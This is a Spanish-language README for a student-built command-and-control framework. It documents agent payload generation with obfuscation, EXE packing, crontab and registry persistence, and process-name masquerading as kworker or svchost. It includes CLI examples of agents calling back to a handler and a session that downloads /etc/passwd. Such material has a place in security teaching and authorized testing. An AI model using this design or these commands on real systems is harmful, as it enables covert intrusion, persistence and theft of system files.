# Entropy C2 Framework

**Author:** jdb / httpbnry

**Entropy** es un framework de Mando y Control (C2) cliente-servidor diseñado con
foco en sigilo, cifrado punto a punto y modularidad. Proyecto desarrollado
para el TFG de Administracion de Sistemas Informaticos (ASIR).

### Funcionalidades

| Categoria | Caracteristicas |
|-----------|----------------|
| **Cifrado** | Comunicacion cifrada con Fernet (AES-128) punto a punto |
| **CLI** | Interfaz por parametros estilo `generate` / `handler` con argparse |
| **Handler** | Shell interactiva multi-sesion con colores, `download`, `upload`, `ping`, `info`, `selfdestruct` |
| **Payloads** | Generacion para Linux y Windows con un solo comando |
| **Ofuscacion** | 3 modos: `none` (legible), `xor` (XOR + base64), `packed` (zlib + base64 stub) |
| **EXE** | Compilacion opcional a ejecutable con PyInstaller (`--onefile --noconsole`) |
| **Persistencia** | Crontab (Linux) / Registro `HKCU\...\Run` (Windows) |
| **Evasion** | Renombrado de proceso a `[kworker/0:0]` / `svchost.exe`, captura total de excepciones |
| **Reconexion** | Bucle de reconexion cada 30s si se pierde la conexion |
| **Autodestruccion** | Elimina persistencia, se borra del disco y sale |

## Arquitectura

```
+-----------------+       Cifrado Fernet       +-----------------+
|   Handler (C2)  | <------------------------> |  Agent (Victim) |
|  (entropy.py)   |     TCP + AES-128          |  (payload.py)   |
+-----------------+                             +-----------------+
```

- **Handler**: Servidor C2 con shell interactiva multi-sesion, colores ANSI,
  transferencia de archivos y gestion de agentes.
- **Agent**: Payload que se ejecuta en la maquina remota. Conexion persistente,
  ofuscacion configurable, autodestruccion y subida/descarga de archivos.

## Requisitos

- Python 3.8+
- `pip install -r requirements.txt`

## Instalacion

```bash
git clone <repo>
cd entropy
pip install -r requirements.txt
```

## Uso rapido

```bash
# Generar payload para Linux sin ofuscacion
python3 entropy.py generate --ip 192.168.1.100 --port 4443

# Generar payload con ofuscacion XOR + compilar a EXE
python3 entropy.py generate --ip 192.168.1.100 --port 4443 --obf xor --exe

# Generar payload para Windows comprimido (packed)
python3 entropy.py generate --ip 10.0.0.5 --port 8080 --os windows --obf packed

# Iniciar handler con clave generada automaticamente
python3 entropy.py handler --port 4443 --gen-key

# Iniciar handler con clave existente
python3 entropy.py handler --port 4443 --key <base64-key>
```

### Generar payload (CLI)

```
$ python3 entropy.py generate --help

usage: entropy.py generate [-h] --ip IP [--port PORT] [--os {linux,windows}]
                           [--obf {none,xor,packed}] [--exe] [--key KEY]
                           [--output OUTPUT] [--name NAME]

options:
  --ip IP               Handler IP (obligatorio)
  --port PORT           Puerto (default: 4443)
  --os {linux,windows}  SO objetivo (default: linux)
  --obf {none,xor,packed}
                        Ofuscacion (default: none)
  --exe                 Compilar a EXE con PyInstaller
  --key KEY             Clave Fernet (auto-generada si se omite)
  --output OUTPUT       Directorio de salida (default: payloads)
  --name NAME           Nombre del archivo generado
```

Ejemplo:

```
$ python3 entropy.py generate --ip 192.168.1.100 --port 4443 --os linux --obf xor

[+] Payload: payloads/agent_linux_192_168_1_100_4443_obf.py
[+] Key:     <base64-key>
```

### Iniciar Handler (CLI)

```
$ python3 entropy.py handler --help

usage: entropy.py handler [-h] [--port PORT] [--host HOST]
                          [--key KEY | --gen-key]

options:
  --port PORT   Puerto de escucha (default: 4443)
  --host HOST   Direccion de escucha (default: 0.0.0.0)
  --key KEY     Clave Fernet
  --gen-key     Generar nueva clave
```

```
$ python3 entropy.py handler --port 4443 --gen-key

[+] Generated key: <base64-key>
[*] Starting handler on 0.0.0.0:4443
[*] Handler listening on 0.0.0.0:4443
```

Cuando un agente conecta:

```
[+] New session #1 from 192.168.1.50:54321
```

### Shell interactiva del Handler

```
entropy(c2)> help

Handler Commands:
   sessions        List active agent sessions
   interact <id>   Interact with an agent session
   generate        Generate an agent payload
   help            Show this help message
   exit / back     Return to main menu
```

### Interaccion con agente

```
entropy(c2)> interact 1

[*] Interacting with session #1 (192.168.1.50:54321)
[*] Type help for commands, back to return
agent(#1)> help

Commands:
   help              Show this help
   back              Return to handler
   ping              Check if agent is alive
   info              Show agent information
   download <path>   Download file from agent
   upload <local> [remote]  Upload file to agent
   selfdestruct      Remove agent from system
   <command>         Execute any shell command

agent(#1)> whoami
root

agent(#1)> download /etc/passwd
[+] Downloaded 1234 bytes: /etc/passwd -> passwd
```

## Caracteristicas

### Handler

- Shell interactiva con colores y prompts informativos
- Multi-sesion (threading)
- Transferencia de archivos: `download` / `upload`
- Comando `ping` para verificar conectividad del agente
- Comando `info` para obtener informacion del sistema remoto
- Comando `selfdestruct` para eliminar el agente del sistema
- Generacion de payloads inline (con ofuscacion y compilacion EXE)

### Agente Linux

- Reconexion persistente cada 30s
- Persistencia via crontab del usuario
- Evasion: renombra proceso a `[kworker/0:0]` (setproctitle)
- Captura total de excepciones (nunca muestra errores en pantalla)
- Ejecuta comandos via `/bin/sh -c`
- Subida/descarga de archivos con codificacion base64
- Autodestruccion: elimina persistencia, se borra a si mismo y sale

### Agente Windows

- Reconexion persistente cada 30s
- Persistencia via registro (`HKCU\...\Run`)
- Evasion: cambia titulo de consola a `svchost.exe` + `CREATE_NO_WINDOW`
- Captura total de excepciones
- Ejecuta comandos via `cmd.exe /c`
- Subida/descarga de archivos con codificacion base64
- Autodestruccion: elimina persistencia, se borra a si mismo y sale

### Ofuscacion

| Modo     | Descripcion                                      |
|----------|--------------------------------------------------|
| `none`   | Codigo legible, IP/PORT/KEY en texto claro       |
| `xor`    | Strings ofuscados con XOR de byte aleatorio      |
| `packed` | Codigo comprimido con zlib + base64 en stub      |

### Compilacion a EXE

Opcionalmente compila el payload a ejecutable con PyInstaller
(`--onefile --noconsole`). Requiere tener PyInstaller instalado.

## Protocolo

1. Handshake: el agente envia `encrypt("beacon")` al conectar
2. Comandos: prefijo de 4 bytes con longitud + datos cifrados (Fernet)
3. Respuestas: mismo formato (prefijo + datos cifrados)
4. Comandos especiales con prefijo `__command__|` para download/upload/autodestruccion

## Estructura

```
entropy/
+-- entropy.py           # Entry point principal
+-- modules/
|   +-- __init__.py
|   +-- crypto.py        # Cifrado Fernet (AES-128)
|   +-- handler.py       # Servidor C2 y shell interactiva
|   +-- agent.py         # Templates de agentes + generacion + ofuscacion
+-- payloads/            # Payloads generados
+-- requirements.txt     # Dependencias
+-- README.md
+-- .gitignore
```

## Nota legal

Esta herramienta se proporciona unicamente con fines educativos y de auditoria
de seguridad autorizada. El uso indebido para acceder a sistemas sin
consentimiento es ilegal. El autor no se responsabiliza del mal uso.
